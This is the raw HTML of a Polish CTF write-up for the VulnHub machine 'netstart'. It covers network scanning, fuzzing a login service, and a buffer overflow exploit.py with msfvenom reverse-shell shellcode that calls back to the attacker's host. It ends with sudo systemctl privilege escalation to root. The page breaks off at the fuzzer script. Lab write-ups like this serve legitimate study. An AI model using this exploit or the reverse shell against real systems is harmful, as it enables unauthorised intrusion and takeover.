(x86)\\Immunity Inc\\Immunity Debugger\\bytearray.bin\" -a 00FDFB48\nOstatecznie doszed≈Çem do momentu gdzie mia≈Çem 8 bad char√≥w ≈ÇƒÖcznie z \\x00.\n!mona bytearray -b \"\\x00\\x2d\\x2e\\x46\\x47\\x59\\x5e\\x60\"\nNastƒôpnie sprawdzi≈Çem adres JMP.\n!mona jmp -r esp -cpb \"\\x00\\x2d\\x2e\\x46\\x47\\x59\\x5e\\x60\"\nAdres to 0x625012B8, ale wpisuje w m√≥j plik exploit.py adres w odwr√≥cony spos√≥b.\nNiestety mia≈Çem problemy z uzyskaniem reverse shella z mojego Windowsa, ale przygotowa≈Çem na gotowo payload na Linuxa i wszystko zadzia≈Ça≈Ço. Nie wiem gdzie by≈Ç problem.\nWygenerowa≈Çem shellcode msfvenom na adres IP mojego Linuxa, okre≈õlony port, oraz dok≈Çadnie te bad chary, kt√≥re znalaz≈Çem.\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.2.128 LPORT=1237 EXITFUNC=thread -b \"\\x00\\x2d\\x2e\\x46\\x47\\x59\\x5e\\x60\" -f c Finalny exploit.py:\nimport socket ip = \"192.168.2.148\" port = 2371 prefix = \"\" offset = 1702 overflow = \"A\" * offset retn = \"\\xc5\\x12\\x50\\x62\" padding = \"\\x90\" * 16 payload=(\"\\x31\\xc9\\xb1\\x11\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x93\" \"\\xba\\xd5\\xb3\\x83\\xeb\\xfc\\xe2\\xf4\\xa2\\x61\\x22\\x50\\xc0\\xf9\\x86\" \"\\xd9\\x91\\x33\\x34\\x03\\xf5\\x77\\x55\\x20\\xca\\x0a\\xea\\x7e\\x13\\xf3\" \"\\xac\\x4a\\xfb\\x7a\\x7d\\xb1\\x13\\xd2\\xd7\\xb3\\x97\\x6f\\x5c\\x52\\x23\" \"\\xdc\\x85\\xe2\\xc0\\x09\\xd6\\x3a\\x72\\x77\\x55\\xe1\\xfb\\xd4\\xfa\\xc0\" \"\\xfb\\xd2\\xfa\\x9c\\xf1\\xd3\\x5c\\x50\\xc1\\xe9\\x5c\\x52\\x23\\xb1\\x18\" \"\\x33\") postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.send(bytes(buffer + \"\\r\\n\", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") Widzimy zmiennƒÖ offset, retn, o kt√≥rej m√≥wi≈Çem wcze≈õniej z odwr√≥conym adresem. Doda≈Çem te≈º padding, aby wszystko zadzia≈Ça≈Ço poprawnie. Uzyska≈Çem po≈ÇƒÖczenie na danym porcie.\nlocal.txt 75894c2b3d5c3b78372af63694cdc659\n Privileges Escalation User fox ma dostƒôp do komendy /usr/bin/systemctl z uprawnieniami administratora, bez has≈Ça.\nZatem zgodnie z GTFOBins wystarczy\nsudo /usr/bin/systemctl !sh i mamy roota üòÅ\n Root proof f632f5eaffa5607c961e22ba40291ab7\n",
  "wordCount" : "1346",
  "inLanguage": "en",
  "image":"https://suszczyk.github.io/thumbnails/netstart.png","datePublished": "2022-09-05T00:00:00Z",
  "dateModified": "2022-09-05T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Mateusz Suszczyk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://suszczyk.github.io/posts/vulnhub/netstart/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Mateusz Suszczyk",
    "logo": {
      "@type": "ImageObject",
      "url": "https://suszczyk.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://suszczyk.github.io" accesskey="h" title="Mateusz Suszczyk (Alt + H)">Mateusz Suszczyk</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://suszczyk.github.io/archives/" title="Archiwum">
                    <span>Archiwum</span>
                </a>
            </li>
            <li>
                <a href="https://suszczyk.github.io/categories/" title="Kategorie">
                    <span>Kategorie</span>
                </a>
            </li>
            <li>
                <a href="https://suszczyk.github.io/tags/" title="Tagi">
                    <span>Tagi</span>
                </a>
            </li>
            <li>
                <a href="https://suszczyk.github.io/search/" title="Szukaj">
                    <span>Szukaj</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://suszczyk.github.io">Home</a>&nbsp;¬ª&nbsp;<a href="https://suszczyk.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      netstart
    </h1>
    <div class="post-meta"><span title='2022-09-05 00:00:00 +0000 UTC'>September 5, 2022</span>&nbsp;¬∑&nbsp;7 min&nbsp;¬∑&nbsp;Mateusz Suszczyk

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#netdiscover" aria-label="netdiscover">netdiscover</a></li>
                <li>
                    <a href="#nmap" aria-label="NMap">NMap</a></li>
                <li>
                    <a href="#windows-10--loginexe" aria-label="Windows 10 &#43; login.exe">Windows 10 + login.exe</a><ul>
                        
                <li>
                    <a href="#fuzzerpy" aria-label="fuzzer.py">fuzzer.py</a></li>
                <li>
                    <a href="#exploitpy" aria-label="exploit.py">exploit.py</a></li>
                <li>
                    <a href="#localtxt" aria-label="local.txt">local.txt</a></li></ul>
                </li>
                <li>
                    <a href="#privileges-escalation" aria-label="Privileges Escalation">Privileges Escalation</a><ul>
                        
                <li>
                    <a href="#root-proof" aria-label="Root proof">Root proof</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>Zaczynam od znalezienia IP maszyny.</p>
<h1 id="netdiscover">netdiscover<a hidden class="anchor" aria-hidden="true" href="#netdiscover">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">‚îå<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>‚îÄ<span style="color:#f92672">[</span>/opt/twint<span style="color:#f92672">]</span>
‚îî‚ïº<span style="color:#f92672">[</span>‚òÖ <span style="color:#f92672">]</span>$sudo netdiscover -r 192.168.2.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts                               
                                                                                             
 <span style="color:#ae81ff">8</span> Captured ARP Req/Rep packets, from <span style="color:#ae81ff">5</span> hosts.   Total size: <span style="color:#ae81ff">480</span>                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.2.1     00:50:56:c0:00:08      <span style="color:#ae81ff">4</span>     <span style="color:#ae81ff">240</span>  VMware, Inc.                              
 192.168.2.2     00:50:56:f0:ed:fa      <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">60</span>  VMware, Inc.                              
 192.168.2.130   00:0c:29:a9:6b:27      <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">60</span>  VMware, Inc.                              
 192.168.2.148   00:0c:29:0a:3a:b3      <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">60</span>  VMware, Inc.                              
 192.168.2.254   00:50:56:f3:5b:b0      <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">60</span>  VMware, Inc.
</code></pre></div><p>IP maszyny Vulnhub: <code>192.168.2.148</code>.
IP Windowsa z Immunity Debugger: <code>192.168.2.130</code>
IP mojego Linuxa, z kt√≥rego atakujƒô: <code>192.168.2.128</code></p>
<hr>
<h1 id="nmap">NMap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/parrot/vulnhub/netstart/results/scans/results/scans/_full_tcp_nmap.txt -oX /home/parrot/vulnhub/netstart/results/scans/results/scans/xml/_full_tcp_nmap.xml 192.168.2.148
Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.148
Host is up, received arp-response <span style="color:#f92672">(</span>0.0036s latency<span style="color:#f92672">)</span>.
Scanned at 2022-08-30 22:34:24 CEST <span style="color:#66d9ef">for</span> 63s
Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
PORT     STATE SERVICE    REASON         VERSION
21/tcp   open  ftp        syn-ack ttl <span style="color:#ae81ff">64</span> vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
| -rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>           <span style="color:#ae81ff">50992</span> Nov <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> login.exe
|_-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>           <span style="color:#ae81ff">28613</span> Nov <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> login_support.dll
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.2.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was <span style="color:#ae81ff">1</span>
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
2371/tcp open  worldwire? syn-ack ttl <span style="color:#ae81ff">64</span>
| fingerprint-strings: 
|   Arucer, DNSStatusRequestTCP, DNSVersionBindReqTCP, DistCCD, FourOhFourRequest, GenericLines, GetRequest, HELP4STOMP, HTTPOptions, Hello, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, Memcache, NCP, NULL, NessusTPv10, NessusTPv11, NessusTPv12, NotesRPC, OfficeScan, RPCCheck, RTSPRequest, Radmin, SIPOptions, SMBProgNeg, SSLSessionReq, SSLv23SessionReq, Socks4, Socks5, SqueezeCenter_CLI, TLSSessionReq, TerminalServer, TerminalServerCookie, Verifier, VerifierAdvanced, WMSRequest, WWWOFFLEctrlstat, X11Probe, ZendJavaBridge, afp, ajp, apple-iphoto, beast2, dominoconsole, drda, firebird, gkrellm, hp-pjl, ibm-db2, ibm-db2-das, ibm-mqseries, informix, metasploit-xmlrpc, ms-sql-s, mydoom, oracle-tns, pervasive-btrieve, pervasive-relational: 
|_    Password:
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2371-TCP:V<span style="color:#f92672">=</span>7.92%I<span style="color:#f92672">=</span>9%D<span style="color:#f92672">=</span>8/30%Time<span style="color:#f92672">=</span>630E748E%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
SF:LL,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLines,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,B,
SF:<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,B,<span style="color:#e6db74">&#34;Pass
</span><span style="color:#e6db74">SF:word:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RPCCheck,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSVersionBindReqTCP,B,<span style="color:#e6db74">&#34;Pas
</span><span style="color:#e6db74">SF:sword:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSStatusRequestTCP,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Hello,B,<span style="color:#e6db74">&#34;Passwo
</span><span style="color:#e6db74">SF:rd:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%
SF:r<span style="color:#f92672">(</span>TerminalServerCookie,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSessionReq,B,<span style="color:#e6db74">&#34;Password:\
</span><span style="color:#e6db74">SF:n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLv23SessionReq,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,B,<span style="color:#e6db74">&#34;Password:\n\0
</span><span style="color:#e6db74">SF:&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SMBProgNeg,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>X11Probe,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Four
SF:OhFourRequest,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LPDString,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPS
SF:earchReq,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPBindReq,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SIPOptio
SF:ns,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LANDesk-RC,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServer,
SF:B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NCP,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NotesRPC,B,<span style="color:#e6db74">&#34;Password:\n\0
</span><span style="color:#e6db74">SF:&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DistCCD,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>JavaRMI,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Radmin,B
SF:,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NessusTPv12,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NessusTPv11,B,<span style="color:#e6db74">&#34;Pas
</span><span style="color:#e6db74">SF:sword:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NessusTPv10,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>WMSRequest,B,<span style="color:#e6db74">&#34;Password:
</span><span style="color:#e6db74">SF:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>oracle-tns,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>mydoom,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>WW
SF:WOFFLEctrlstat,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Verifier,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Verif
SF:ierAdvanced,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Socks5,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Socks4,B,<span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">SF:Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>OfficeScan,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>ms-sql-s,B,<span style="color:#e6db74">&#34;Password:
</span><span style="color:#e6db74">SF:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HELP4STOMP,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Memcache,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>
SF:beast2,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>firebird,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>ibm-db2-das,B
SF:,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>ibm-db2,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>pervasive-relational,B
SF:,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>pervasive-btrieve,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>ajp,B,<span style="color:#e6db74">&#34;Passw
</span><span style="color:#e6db74">SF:ord:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>hp-pjl,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>afp,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Squee
SF:zeCenter_CLI,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Arucer,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>dominocon
SF:sole,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>informix,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>drda,B,<span style="color:#e6db74">&#34;Passwor
</span><span style="color:#e6db74">SF:d:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>ibm-mqseries,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>apple-iphoto,B,<span style="color:#e6db74">&#34;Password:\
</span><span style="color:#e6db74">SF:n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>ZendJavaBridge,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>gkrellm,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>%
SF:r<span style="color:#f92672">(</span>metasploit-xmlrpc,B,<span style="color:#e6db74">&#34;Password:\n\0&#34;</span><span style="color:#f92672">)</span>;
MAC Address: 00:0C:29:0A:3A:B3 <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
TCP/IP fingerprint:
OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.92%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>8/30%OT<span style="color:#f92672">=</span>21%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>41661%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>1%DC<span style="color:#f92672">=</span>D%G<span style="color:#f92672">=</span>Y%M<span style="color:#f92672">=</span>000C29%T
OS:M<span style="color:#f92672">=</span>630E748F%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>104%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10B%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I
OS:%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M5B4ST11NW7%O2<span style="color:#f92672">=</span>M5B4ST11NW7%O3<span style="color:#f92672">=</span>M5B4NNT11NW7%O4<span style="color:#f92672">=</span>M5B4ST11NW7%O
OS:5<span style="color:#f92672">=</span>M5B4ST11NW7%O6<span style="color:#f92672">=</span>M5B4ST11<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FE88%W2<span style="color:#f92672">=</span>FE88%W3<span style="color:#f92672">=</span>FE88%W4<span style="color:#f92672">=</span>FE88%W5<span style="color:#f92672">=</span>FE88%W6
OS:<span style="color:#f92672">=</span>FE88<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>FAF0%O<span style="color:#f92672">=</span>M5B4NNSNW7%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%S<span style="color:#f92672">=</span>O
OS:%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>
OS:0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%
OS:S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>U1<span style="color:#f92672">(</span>
OS:R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%IPL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>
OS:N%T<span style="color:#f92672">=</span>40%CD<span style="color:#f92672">=</span>S<span style="color:#f92672">)</span>

Uptime guess: 47.273 days <span style="color:#f92672">(</span>since Thu Jul <span style="color:#ae81ff">14</span> 16:02:08 2022<span style="color:#f92672">)</span>
Network Distance: <span style="color:#ae81ff">1</span> hop
TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">260</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
IP ID Sequence Generation: All zeros
Service Info: OS: Unix
</code></pre></div><p>Mamy dwa otwarte porty: <code>21</code> oraz <code>2371</code>. Widzimy ju≈º ze skanu nmapa, ≈ºe na ftp mamy dwa pliki potrzebne do Buffer Overflow. Sprawdzi≈Çem te≈º port <code>2171</code>.</p>
<p>Port po zapytaniu prosi o has≈Ço.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">‚îå<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>‚îÄ<span style="color:#f92672">[</span>~/vulnhub/netstart<span style="color:#f92672">]</span>
‚îî‚ïº<span style="color:#f92672">[</span>‚òÖ <span style="color:#f92672">]</span>$nc 192.168.2.148 <span style="color:#ae81ff">2371</span>
Password:
test
</code></pre></div><hr>
<h1 id="windows-10--loginexe">Windows 10 + login.exe<a hidden class="anchor" aria-hidden="true" href="#windows-10--loginexe">#</a></h1>
<p>Przygotowa≈Çem wcze≈õniej ≈õrodowisko, na kt√≥rym przeprowadzƒô exploit. IP Windowsa to <code>192.168.2.130</code>. Uruchomi≈Çem aplikacjƒô w programie <code>Immunity Debugger</code>. Teraz przy pr√≥bie po≈ÇƒÖczenia na porcie <code>2371</code> otrzymujemy zapytanie o has≈Ço, czyli wszystko jest w porzƒÖdku.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220830230528.png" alt=""  />
</p>
<p>Przystƒôpujƒô do dzia≈Çania. Zaczynam od fuzzingu portu. Sprawdzƒô na ilu przygotowanych bajtach ciƒÖgu liter <code>A</code> program siƒô wysypie.</p>
<hr>
<h2 id="fuzzerpy">fuzzer.py<a hidden class="anchor" aria-hidden="true" href="#fuzzerpy">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span> time<span style="color:#f92672">,</span> sys

